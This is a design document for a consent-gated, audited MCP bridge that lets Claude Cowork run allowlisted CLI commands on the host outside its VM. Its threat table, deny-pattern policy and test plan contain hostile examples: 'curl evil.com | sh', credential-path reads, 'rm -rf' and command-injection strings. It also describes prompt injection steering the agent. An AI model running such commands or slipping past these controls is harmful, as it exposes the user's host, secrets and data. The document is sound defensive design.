# Host CLI Bridge for Claude Cowork — Target Architecture Design

*Design document · July 2026 · Status: CORE IMPLEMENTED; distribution validation in progress*

---

## 0. Reading this document

This design specifies a **host-side MCP server** that lets Claude Cowork request execution of CLI commands on the host machine — deliberately *outside* Cowork's isolated VM. This is, by construction, a controlled breach of Cowork's primary security boundary (VM isolation of code execution). The entire value of a *designed* bridge over an ad-hoc one is that the breach is **narrow, consent-gated, and fully audited**. Those three properties are treated here as hard requirements, not features.

If you only read one section, read §3 (Threat model) and §6 (Security controls). The rest is implementation.

---

## 1. Problem statement & goals

### 1.1 Problem
Cowork's code execution runs inside an isolated Linux VM. Host-native CLI tools (Homebrew packages, `dotnet`, Xcode CLT, licensed binaries, project build tooling, `git` against host credentials) are unreachable from inside the VM. Some legitimate workflows — building a host project, running host-installed test tooling, invoking a signing tool — require executing on the host.

### 1.2 Goals
- Let Cowork invoke a **bounded set** of host CLI operations through a standard MCP tool.
- Keep the host attack surface **small and auditable** (few tools, explicit schema).
- Make every host execution **observable** (structured audit log) and, by default, **consent-gated**.
- Fail safe: default-deny, explicit allowlisting, no silent privilege escalation.

### 1.3 Explicit non-goals
- **Not** a general remote shell. No interactive PTY, no long-lived sessions, no `sudo` elevation path.
- **Not** a way to bypass Cowork's own permission prompts — it *adds* a layer, never removes one.
- **Not** a multi-tenant / networked service in its baseline form (see §8 for the hardened HTTP variant and why it's a separate risk tier).
- Not a replacement for doing work *inside* the VM when the VM can do it. The bridge is the exception path.

### 1.4 Design principle
> **Smallest hole that does the job.** Every capability added to the bridge widens the boundary breach. Default posture is deny; each allowed command class must be justified, allowlisted, and logged.

---

## 2. Context & prior art

Cowork reads MCP servers from the Claude Desktop config (`claude_desktop_config.json`) and forwards them into the VM via an SDK passthrough layer. A server declared there runs as a **child process on the host**, under the launching user's identity, while its tools become callable from inside the VM. This is exactly the seam a host bridge exploits — the tool call originates in the VM, but the tool *implementation* executes host-side.

The existing community reference is `cowork-terminal-mcp`: a ~200-line stdio server exposing one `execute_command` tool (params: `command`, `cwd`, `timeout`, `env`), returning `{stdout, stderr, exitCode, timedOut}`, with 1 MB per-stream output caps, `AbortController`-based timeouts, and absolute-path shell resolution. It is a good baseline but is intentionally *permissive* — arbitrary bash, no allowlist, no consent gate, no persistent audit. This design keeps its ergonomics and adds the controls a research-grade / enterprise deployment needs.

**Transport decision:** use **stdio**, not HTTP. Rationale: (a) Claude Desktop's config validates stdio server entries only — a `url` field is silently dropped; (b) stdio inherits the launching user's environment and permissions, so there is no network auth surface to design or misconfigure; (c) the client launches the process, eliminating startup-race and port-exposure classes of bug. A networked HTTP variant is possible but is a materially higher risk tier — see §8.

---

## 3. Threat model

### 3.1 Trust boundaries
```
  [ Claude model / VM-side agent ]   <-- NOT fully trusted (prompt-injectable)
             |  MCP tool call (execute_command)
             v
  [ Cowork SDK passthrough ]          <-- transport, assumed intact
             |  stdio JSON-RPC
             v
  [ Host bridge process ]  <== THE control point. Runs as host user.
             |  spawn()
             v
  [ Host OS + CLI binaries ]          <-- full user privileges
```

### 3.2 Key threat: the caller is not fully trusted
The agent issuing the tool call can be steered by **prompt injection** — malicious content in a file, web page, or repo the agent processed. Anthropic reports a ~1% injection success rate in internal testing: managed, not zero. Therefore the bridge **must not treat an incoming `execute_command` as inherently authorized.** The command string is attacker-influenceable input.

### 3.3 Threats enumerated
| # | Threat | Vector | Primary control |
|---|--------|--------|-----------------|
| T1 | Arbitrary host code execution | Injected command string | Allowlist + consent gate (§6.1, §6.2) |
| T2 | Data exfiltration via host network | `curl evil.com \| sh`, `scp` | Command allowlist; egress not covered by VM controls — see §6.6 |
| T3 | Credential theft | Reading `~/.ssh`, `~/.aws`, keychain | Path/arg denylist; run under restricted profile (§6.4) |
| T4 | Privilege escalation | `sudo`, setuid binaries | Hard-block `sudo`; no elevation (§6.3) |
| T5 | Destructive commands | `rm -rf`, disk format | Consent gate + dry-run classification (§6.2) |
| T6 | Command injection / quoting confusion | Shell metachar in args | Argv execution, no shell string interp by default (§6.5) |
| T7 | Resource exhaustion | Fork bomb, fill disk | Timeout, output cap, optional cgroup/ulimit (§6.7) |
| T8 | Audit evasion | Command hides its own trace | Append-only log written *before* exec, tamper-evident (§6.8) |
| T9 | Windows shell-resolution hijack | `System32\bash.exe` (WSL) picked up | Absolute-path pinned shell resolution (§7.2) |
| T10 | Silent output truncation misleads agent | >cap output | Explicit truncation markers (§5.3) |

---

## 4. Architecture overview

```
                        HOST MACHINE
 +--------------------------------------------------------------+
 |                                                              |
 |   Claude Desktop  --launches-->  Host CLI Bridge (stdio)     |
 |        |                              |                      |
 |        | forwards tools               |  layered pipeline:   |
 |        v                              v                      |
 |   Cowork VM  --execute_command-->  [1] Schema validate       |
 |   (agent)      (JSON-RPC)          [2] Policy engine         |
 |                                        - allowlist match     |
 |                                        - denylist / arg scan |
 |                                        - risk classify       |
 |                                    [3] Consent gate (if req) |
 |                                    [4] Audit log (pre-exec)  |
 |                                    [5] Sandboxed spawn       |
 |                                        - argv, no shell*     |
 |                                        - restricted env      |
 |                                        - timeout + caps      |
 |                                    [6] Audit log (post-exec) |
 |                                        return {stdout,...}   |
 +--------------------------------------------------------------+
```
Every request flows through all six stages in order. Any stage may reject; rejection is logged and returned as a structured error, never a silent pass.

### 4.1 Component responsibilities
- **Transport adapter** — stdio JSON-RPC (MCP SDK). Nothing but JSON-RPC on stdout; all diagnostics to stderr.
- **Schema validator** — rejects malformed calls before any logic runs.
- **Policy engine** — the heart of the system (§6.1–6.3). Pure function: `(request, policy) -> decision`. No side effects, unit-testable, reloadable.
- **Consent gate** — surfaces an out-of-band host-side approval for anything not on the auto-approve list (§6.2).
- **Audit logger** — append-only, writes intent *before* execution and outcome *after* (§6.8).
- **Executor** — argv spawn with timeout, output caps, restricted environment, optional OS-level sandbox (§6.4–6.7).

---

## 5. Tool surface (MCP contract)

Keep the catalogue minimal — a small surface is easier for the model to use correctly and easier for a human to audit. Baseline: **one** primary tool plus two read-only introspection tools.

### 5.1 `execute_command` (the one that acts)
Input schema (Zod/JSON-Schema):
```
{
  command:  string        // required. Program + args, argv-parsed (see §6.5)
  cwd?:     string        // default: configured workspace root; must resolve within an allowed root
  timeout?: number        // ms, default 30000, hard ceiling 300000
  env?:     Record<string,string>  // overlaid on a *minimal* base env, keys allowlisted (§6.4)
  reason?:  string        // agent-supplied justification, logged, shown in consent prompt
}
```
Output:
```
{
  stdout: string          // capped, see §5.3
  stderr: string          // capped
  exitCode: number | null // null when timedOut or killed
  timedOut: boolean
  truncated: { stdout: boolean, stderr: boolean }
  decision: "auto" | "consented"   // how it was authorized
  auditId: string         // correlates to the audit log entry
}
```

### 5.2 `list_allowed_commands` (read-only)
Returns the active allowlist (command classes, patterns) and current risk classification rules. Lets the agent *self-select* valid commands instead of guessing and getting rejected — reduces failed calls and injection-probing noise. No side effects.

### 5.3 Output handling
Cap each stream (default 1 MB). On overflow, truncate and set `truncated.stdout|stderr = true` **and** append a visible marker (`[stdout truncated at 1MB]`). Never silently drop — a model that thinks it saw full output makes bad decisions (T10). Streaming/`tail -f` workloads are explicitly out of scope; buffered one-shot only.

---

## 6. Security controls (the core of the design)

### 6.1 Allowlist-first policy engine (T1)
Default-deny. A command is eligible only if it matches an entry in a declarative policy file. Two allowlist styles, combinable:

- **Program allowlist** — the resolved executable basename must be in an approved set (`git`, `dotnet`, `npm`, `make`, `pytest`, …). This is the recommended default.
- **Pattern allowlist** — regex/glob over the normalized command for finer control (e.g. allow `git status|log|diff|add|commit|push` but not arbitrary `git config`).

Policy is a versioned file (`bridge.policy.yaml`) loaded at startup and hot-reloadable. Example:
```yaml
version: 1
default: deny
allow:
  - program: git
    args_allow: ["status","log","diff","add","commit","push","pull","fetch"]
    risk: low
  - program: dotnet
    args_allow: ["build","test","restore","run"]
    risk: medium
  - program: make
    risk: medium
deny_always:                     # belt-and-suspenders, evaluated first
  - pattern: "\\bsudo\\b"
  - pattern: "\\brm\\s+-rf\\s+/"
  - pattern: "(~|/)\\.(ssh|aws|gnupg)\\b"
consent_required_above: low      # low = auto; medium/high require §6.2
roots_allow:                     # cwd and path args must resolve within these
  - "~/projects"
```

### 6.2 Consent gate (T1, T5)
Any command classified above the `consent_required_above` threshold triggers a **host-side, out-of-band approval** before execution — a native prompt, a CLI confirmation in a controlling terminal, or a desktop notification with allow/deny. Rationale: consent must be collected on a channel the *agent cannot drive*. If the agent could approve its own commands, the gate is theater. The prompt shows: resolved program, full argv, `cwd`, and the agent's `reason`. Decisions are logged. Optional TTL-scoped "approve this command class for N minutes" to cut fatigue without going fully open.

### 6.3 No elevation, ever (T4)
`sudo`, `doas`, `runas`, `pkexec` and setuid escalation are hard-denied in `deny_always` and cannot be allowlisted. The bridge runs as the launching (non-root) user and stays there. If a workflow *needs* root, that is a human-in-the-loop action outside this tool by design.

### 6.4 Restricted execution environment (T3)
- **Minimal base env.** Do not inherit the full `process.env`. Start from a curated allowlist (`PATH`, `HOME`, `LANG`, language-runtime vars the allowed tools need) and overlay only allowlisted keys from the request's `env`. This keeps tokens/secrets in the parent env from leaking into arbitrary children.
- **Dedicated low-privilege profile (recommended).** Run the executor under a restricted OS profile: macOS `sandbox-exec` / App Sandbox profile, Linux via a dedicated user + `bwrap`/seccomp, Windows via a restricted token / AppContainer. Deny read access to credential paths (`~/.ssh`, `~/.aws`, keychain) unless a specific allowlisted tool needs them.
- **Path confinement.** `cwd` and any path-like arg must resolve (after symlink resolution) within `roots_allow`. Reject traversal outside it.

### 6.5 Argv execution, not shell strings (T6)
Default execution mode parses `command` into an argv array and spawns the program **directly, without an intermediary shell**, so shell metacharacters (`;`, `|`, `$()`, backticks, redirects) are inert. This kills the largest command-injection class outright.

Some legitimate workflows need shell features (pipelines, heredocs). Handle these as an **explicit, separately-allowlisted, higher-risk mode** — e.g. a `shell: true` flag that (a) is off by default, (b) forces `consent_required`, (c) pins an absolute-path bash (§7.2), never the ambient shell. Do not make shell interpretation the default just because a few commands want it.

### 6.6 Network egress awareness (T2)
Critical caveat: **host-side execution is not subject to Cowork's VM egress controls.** A command run through the bridge can reach the network with the host user's full connectivity. The allowlist is therefore the *only* egress control for bridged commands. Treat any allowlisted program capable of arbitrary network I/O (`curl`, `wget`, `ssh`, `scp`, package managers pulling from arbitrary URLs) as elevated risk, and prefer narrow pattern allowlists over blanket program allows. Document this prominently for operators — it is the least-intuitive part of the model.

### 6.7 Resource limits (T7)
- **Timeout:** per-call, default 30 s, hard ceiling 300 s. Implemented via `AbortController`→process kill, not a `timeout` prefix in the command string (keeps timeout logic out of attacker-influenceable text; behaves identically cross-platform).
- **Output caps:** per-stream (§5.3).
- **Optional OS limits:** `ulimit`/cgroup (Linux), job objects (Windows) for CPU/memory/process-count ceilings to blunt fork bombs.

### 6.8 Audit logging (T8)
- **Append-only**, written to a path the executed commands themselves cannot trivially rewrite (ideally outside `roots_allow`, restrictive perms — note prior research found some Cowork logs world-readable at mode 644; do better: 600).
- **Pre-execution entry** (intent): timestamp, `auditId`, resolved program+argv, `cwd`, env keys (not values), agent `reason`, policy decision + matched rule. Written *before* spawn so a command that kills the process still leaves its intent recorded.
- **Post-execution entry** (outcome): exitCode, timedOut, truncation flags, duration, output byte counts (not necessarily full output).
- **Tamper-evidence (optional, research-grade):** hash-chain entries (each record includes hash of the prior) so deletion/edit is detectable.
- Format: newline-delimited JSON (`audit.jsonl`) for easy ingestion into OpenTelemetry / SIEM — relevant because Cowork activity is *not* in Anthropic's cloud audit logs, so this bridge is your only record of host actions.

---

## 7. Platform-specific implementation notes

### 7.1 Config registration
Register as a stdio server in `claude_desktop_config.json`:
```json
{
  "mcpServers": {
    "host-cli-bridge": {
      "command": "node",
      "args": ["/abs/path/to/host-cli-bridge/dist/index.js", "--policy", "/abs/path/bridge.policy.yaml"]
    }
  }
}
```
Config locations: macOS `~/Library/Application Support/Claude/claude_desktop_config.json`; Windows (standard) `%APPDATA%\Claude\claude_desktop_config.json`; Windows (Store) under `%LOCALAPPDATA%\Packages\Claude_.../LocalCache\Roaming\Claude\`. On Windows wrap npx-style launches in `cmd /c`.

### 7.2 Windows shell-resolution trap (T9)
Do **not** `spawn("bash")` on Windows. `C:\Windows\System32\bash.exe` is the WSL launcher and will run commands in a *different* Linux VM that can't see the host filesystem or run host `.exe`s — symptom: host-installed tools report "command not found." When a shell is needed (§6.5), resolve an absolute Git-Bash path by walking known install locations (`Program Files\Git\bin\bash.exe`, etc.) and fail loudly if none found. Never fall back to `System32`. For the argv-default path this is moot — you spawn the program directly.

### 7.3 stdio discipline
Only JSON-RPC on stdout. Every log line, warning, and diagnostic goes to stderr. A stray `console.log` corrupts the MCP message stream and hangs the client. Route the audit log to a file, never stdout.

### 7.4 Path translation (VM ↔ host)
The agent may hand the bridge a **VM-internal path** (`/sessions/<name>/mnt/uploads/x`) that means nothing on the host. Decide and document a translation contract: either (a) require host-relative paths in tool args and reject VM paths, or (b) implement a known-mount translation table (`/sessions/<name>/mnt/<folder>` → host folder). Option (a) is simpler and less error-prone for a first version. This mirrors a known open Cowork issue and should be an explicit, tested behavior, not left to chance.

---

## 8. Optional hardened variant: networked / multi-client (higher risk tier)

If the bridge must serve more than one client or run on a different host than the desktop app, switch transport to **Streamable HTTP** (the current standard; legacy HTTP+SSE is deprecated). This is a **separate, higher risk tier** and pulls in obligations the stdio baseline avoids:
- Bind to `127.0.0.1` only unless remote access is a hard requirement; if remote, mandatory TLS.
- Real authn/authz on every request (OAuth/bearer) — there is no ambient "launching user" trust anymore.
- Per-client identity in the audit log.
- All §6 controls still apply, unchanged.
Recommendation: ship stdio first. Only take on the HTTP variant with a concrete multi-client requirement and a security review, because it converts a local-only breach into a network-reachable one.

---

## 9. Failure modes & fail-safe behavior

| Condition | Behavior |
|-----------|----------|
| Policy file missing/invalid at startup | Refuse to start (fail closed), log to stderr. Never start in allow-all. |
| Policy hot-reload parse error | Keep prior good policy, log error, do not fall open. |
| Consent gate channel unavailable | Deny any consent-required command (fail closed), return structured error. |
| Audit log unwritable | Deny execution (no execution without a record), surface error. |
| Command not on allowlist | Reject with the reason + point to `list_allowed_commands`. |
| Timeout hit | Kill process, return `timedOut:true, exitCode:null`. |
| Output over cap | Truncate, mark, return partial. |

Guiding rule: **when any control cannot be enforced, deny rather than degrade.**

---

## 10. Testing & validation strategy

- **Policy engine unit tests** — table-driven: for each (command, policy) assert allow/deny/consent + matched rule. Include injection strings (`; rm -rf`, `$(curl…)`, unicode/whitespace evasions, path traversal, symlink escapes).
- **Denylist red-team suite** — the T1–T10 vectors as concrete failing-if-executed cases; assert every one is blocked *before* spawn.
- **Consent-gate tests** — assert consent-required classes cannot execute without an approval token, and that approval can't originate from the request payload itself.
- **Audit completeness** — assert a pre-exec record exists for every spawn, including commands that then kill the process/time out.
- **Platform matrix** — Windows shell resolution (must pick Git Bash, never System32), macOS/Linux argv path, path-translation contract.
- **Fail-closed tests** — corrupt policy, unwritable audit dir, dead consent channel → all deny.

---

## 11. Open questions for the research proposal

- **Consent fatigue vs. safety.** Where is the auto-approve line? Does TTL-scoped class approval meaningfully reduce risk vs. per-command prompts? Measurable with session logs.
- **Injection resilience end-to-end.** With the allowlist in place, what residual injection surface remains via *allowed* commands (e.g. `git` subcommand abuse, build scripts invoking arbitrary code)? This is arguably the most interesting research question — the allowlist narrows but does not eliminate.
- **OS-sandbox strength.** How much does the §6.4 restricted profile actually contain an allowlisted-but-malicious build script on each platform? Comparative evaluation across `sandbox-exec`, `bwrap`/seccomp, AppContainer.
- **Egress gap.** Should the bridge add its own outbound network policy for child processes (e.g. per-command network namespace) given VM egress controls don't apply? Feasibility per platform.
- **Tamper-evident audit.** Is a hash-chained local log sufficient, or does meaningful assurance require streaming to an external collector the agent can't reach?
- **Detectability.** Since host-side execution is invisible to EDR-inside-VM assumptions and to Anthropic's cloud audit logs, what host-side telemetry (OpenTelemetry export) gives an operator adequate visibility?

---

## 12. Summary

The bridge is a deliberate, narrow exception to Cowork's VM isolation. It is defensible only if it is **default-deny, allowlist-gated, consent-gated above a low risk threshold, run in a restricted environment, and completely audited** — with every control failing *closed*. The reference `cowork-terminal-mcp` supplies the ergonomic baseline (stdio, single tool, output caps, absolute-path shell, no PTY); this design keeps that and adds the policy engine, consent gate, restricted execution profile, and tamper-evident audit that turn an open escape hatch into a controlled, reviewable capability. Ship the stdio version first; treat the networked variant as a distinct, higher-risk project.

---

## 13. Sources

1. Anthropic — *Claude Cowork desktop architecture overview*: https://support.claude.com/en/articles/14479288-claude-cowork-desktop-architecture-overview
2. Anthropic — *Get started with Claude Cowork*: https://support.claude.com/en/articles/13345190-get-started-with-claude-cowork
3. Marius Bughiu — *cowork-terminal-mcp: Host Terminal Access for Claude Cowork* (reference implementation): https://startdebugging.net/2026/04/cowork-terminal-mcp-host-terminal-access-for-claude-cowork/
4. Marius Bughiu — *MCP stdio vs HTTP vs SSE Transport* (transport selection): https://startdebugging.net/2026/07/mcp-stdio-vs-http-vs-sse-transport-which-to-choose/
5. MCP specification `2025-11-25` — Transports: https://modelcontextprotocol.io/specification/2025-11-25/basic/transports
6. anthropics/claude-code Issue #27758 — MCP file-path translation in Cowork: https://github.com/anthropics/claude-code/issues/27758
7. Pluto Security — *Inside Claude Cowork* (isolation model, audit-log observations): https://pluto.security/blog/inside-claude-cowork-how-anthropics-autonomous-agent-actually-works/

*This design targets the Cowork architecture as understood July 2026; verify VM/passthrough behavior against Anthropic's Trust Center before implementation, as it evolves frequently.*
